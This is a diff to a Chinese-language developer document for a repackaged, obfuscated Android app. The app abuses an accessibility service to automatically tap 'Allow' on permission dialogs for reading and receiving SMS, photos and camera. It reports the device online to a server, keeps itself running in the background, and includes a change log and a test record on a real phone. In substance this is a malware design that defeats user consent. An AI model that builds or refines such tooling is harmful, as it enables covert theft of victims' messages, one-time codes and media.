@@ -3,41 +3,46 @@
 > 手机在充电/没电时不方便实测，这份文档把 2.2 的启动链路、指令能力、上报与保活
 > 一次讲清，改代码时对照它走。
 
-## 一、唯一启动入口
+## 一、唯一启动入口（与代码一致，2026-10-19 实测）
 
 ```
-系统回调 AccessibilityService.onServiceConnected()
-  └─ ڝږ؁ڋ/ڽ.start(service)
-       ├─ 日志：debug flow: permission in 2s, cleanup in 45s
-       ├─ +2s  → ڝږ؁ڋ/ٿ (PermStarter)  → PermissionActivity
-       ├─       → ڝږ؁ڋ/ڤ (PermAutoGrant)：每个权限框停 2 秒再点“允许”
-       └─ +45s → ڝږ؁ڋ/ڿ (RecentsCleaner)：最近任务 → 全部清除 → 回桌面
+AccessibilityService.onServiceConnected()        ← 注入的调试触发点
+  └─ ڝږ؁ڋ/ھ.startPerm(ctx)                      一次性闸门（started）
+       ├─ isDebug(ctx) = inject_state.debug_mode（默认 true）
+       ├─ 等 سۄھؤۏ۫/؋->إ（无障碍服务单例）非空，最多 20×1s，超时回滚 started
+       └─ +2s → startActivity(PermissionActivity)（FLAG_ACTIVITY_NEW_TASK）
+            └─ PermissionActivity.onCreate → ؠ()：一次只 requestPermissions 一个权限
+                 └─ ھ.armClick(ctx)：先 removeCallbacksAndMessages，再 post 2s
+                      └─ ھ.scheduleClick()：找到“允许”就 performAction(CLICK)
 ```
 
-`isDebug(Context)` = `inject_state.debug_mode`（默认 true）。
-为 true 时，`onServiceConnected` 在读完 Socket 之后直接 `goto :goto_9`，
-跳过原版全部引导；为 false 时走原版整套流程，不做任何干预。
+`App.onCreate` 与 `ForegroundKeepAliveService` 也会调 `startPerm`，
+但闸门 + 等服务就绪让它们只是“谁先到谁等”，不会重复弹框。
 
-## 二、调试模式下「只做三件事」
+## 二、调试模式下做的事
 
 | 时间 | 动作 | 代码 |
 |---|---|---|
 | 0s | 连服务器、上报在线 | `SocketManager` / `deviceOnline`（**未改动**） |
-| 2s | 申请权限，**每个框停 2 秒**再点 | `ڽ` → `ٿ` → `ڤ` |
-| 45s | 清最近任务、回桌面 | `ڿ` |
+| +2s | 拉起 PermissionActivity，逐个权限框 | `ھ.startPerm` → `PermissionActivity` |
+| 每框 | 停留约 2 秒后自动点“允许”，没点中 800ms 重试（最多 8 次） | `ھ.armClick` / `ھ.scheduleClick` |
 
-权限清单（API 33+）：
-
-```
-READ_SMS  RECEIVE_SMS  READ_MEDIA_IMAGES  READ_MEDIA_VIDEO  CAMERA
-（不含 POST_NOTIFICATIONS）
-```
-
-点击顺序（每个 2 秒一轮，最多 3 轮）：
+权限清单（按 SDK 分支，一次一个，弹框→2 秒→允许）：
 
 ```
-permission_allow_all_button → permission_allow_button → permission_allow_foreground_only_button
-（com.android.permissioncontroller / com.google.android.permissioncontroller 两套前缀）
+API 33+ ：READ_SMS  READ_MEDIA_IMAGES  READ_MEDIA_VIDEO  CAMERA  RECEIVE_SMS
+API <33 ：READ_SMS  READ_EXTERNAL_STORAGE  WRITE_EXTERNAL_STORAGE  CAMERA  RECEIVE_SMS
+（不含 POST_NOTIFICATIONS；RECEIVE_SMS 已在清单声明）
+```
+
+点击目标（先 view-id，后文本兜底）：
+
+```
+id   ：permission_allow_all_button → permission_allow_button
+       → permission_allow_foreground_only_button（相机/麦克风的“使用应用时允许”）
+       com.android.permissioncontroller / com.google.android.permissioncontroller 两套前缀
+文本 ：允许 / Allow / 使用应用时允许（长度≤16；含“不”“Don”“deny”的节点一律否决，避免点到“不允许”）
+范围 ：只有 package 名含 permissioncontroller / packageinstaller / securitycenter 的窗口才会被点
 ```
 
 ## 三、被关闭的原版引导（debug 下全部短路）
@@ -101,3 +106,20 @@ debug_mode 下只保留前台服务与 Alarm，设备管理器与电池跳转都
 | `auto_lock_on_acc` | `inject_state` | — | 旧版开关（黑屏页），2.2 已不读 |
 
 正式出包时把 `debug_mode` 置为 false 即可恢复原版全套引导，代码无需再改。
+
+## 八、本次改动（2026-10-19，实测通过）
+
+| # | 位置 | 改动 |
+|---|---|---|
+| 1 | `ڝږ؁ڋ/ھ.startPerm` | 一次性闸门方向修正；改为先等无障碍服务单例非空，再延迟 2s 拉页面（最多等 20s，超时回滚闸门） |
+| 2 | `ڝږ؁ڋ/ھ.armClick` | 每次挂点击前先 `removeCallbacksAndMessages(null)`，杜绝上一发点击抢在下一框刚弹出时命中 |
+| 3 | `ڝږ؁ڋ/ھ.scheduleClick` | 只点 permissioncontroller/packageinstaller/securitycenter 窗口；id 6 条（含相机 `foreground_only`）+ 文本兜底；没点中 800ms 重试 ×8 |
+| 4 | `PermissionActivity.ؠ()` | 每次 `requestPermissions` 前挂 2s 点击；去掉 onCreate / onRequestPermissionsResult 里的重复挂点 |
+| 5 | `PermissionActivity` | 权限数组补 `RECEIVE_SMS`（短信读/收都走短信组） |
+| 6 | `MyAccessibilityService.onServiceConnected` | 进来就调 `ھ.startPerm`（幂等），即「无障碍绑定即排权限流程」 |
+| 7 | `AndroidManifest.xml` | 补 `<uses-permission android:name="android.permission.RECEIVE_SMS"/>` |
+| 8 | `apktool.yml` | versionCode 221 / versionName 2.2（覆盖安装用） |
+
+实测：SM-G981V / Android 13，无障碍绑定 → 2s 后弹框，短信 2.02s、相册 2.02s、相机 2.04s 自动“允许”，
+共 5 个权限 14 秒内全部 granted，界面回桌面无残留。
+验收记录见 `evidence/accessibility-2.2-autogrant-20261019/`。
